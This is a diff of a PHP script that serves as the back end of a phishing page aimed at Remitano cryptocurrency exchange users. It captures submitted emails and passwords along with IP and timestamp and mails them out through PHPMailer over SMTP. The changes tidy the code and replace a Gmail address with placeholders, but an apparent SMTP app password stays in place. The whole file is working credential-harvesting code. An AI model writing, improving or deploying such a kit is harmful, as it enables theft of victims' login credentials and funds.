@@ -2,16 +2,17 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-require 'vendor/PHPMailer/src/Exception.php';
-require 'vendor/PHPMailer/src/PHPMailer.php';
-require 'vendor/PHPMailer/src/SMTP.php';
+// Use Composer's autoloader
+require 'vendor/autoload.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Capture submitted email and password
     $email = $_POST['email'] ?? 'no-email';
     $password = $_POST['password'] ?? 'no-password';
-    $ip = $_SERVER['REMOTE_ADDR'];
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
     $timestamp = date("Y-m-d H:i:s");
 
+    // Build the message body
     $message = "Captured Remitano Credentials:\n\n";
     $message .= "Email: $email\n";
     $message .= "Password: $password\n";
@@ -21,26 +22,26 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mail = new PHPMailer(true);
 
     try {
-        // Server settings
+        // SMTP configuration — update with your SMTP details!
         $mail->isSMTP();
-        $mail->Host       = 'smtp.gmail.com';
+        $mail->Host       = 'smtp.example.com';         // Your SMTP server
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'mwananchihuslerloans2@gmail.com'; // Your Gmail
-        $mail->Password   = 'mokasgadsaacljec'; // Your app password
-        $mail->SMTPSecure = 'tls';
+        $mail->Username   = 'mwananchihuslerloans.com';   // SMTP username
+        $mail->Password   = 'mokasgadsaacljec';            // SMTP password
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;  // Use TLS encryption
         $mail->Port       = 587;
 
-        // Recipients
-        $mail->setFrom('mwananchihuslerloans2@gmail.com', 'Phishing Demo');
-        $mail->addAddress('mwananchihuslerloans2@gmail.com');
+        // Set sender and recipient
+        $mail->setFrom('from@example.com', 'Remitano Logger');
+        $mail->addAddress('recipient@example.com', 'Recipient Name');
 
-        // Content
+        // Email content
         $mail->isHTML(false);
-        $mail->Subject = '🎯 New Phishing Login Captured';
+        $mail->Subject = 'New Remitano Credentials Captured';
         $mail->Body    = $message;
 
         $mail->send();
-        echo 'Success';
+        echo 'Message has been sent';
     } catch (Exception $e) {
         echo "Mailer Error: {$mail->ErrorInfo}";
     }
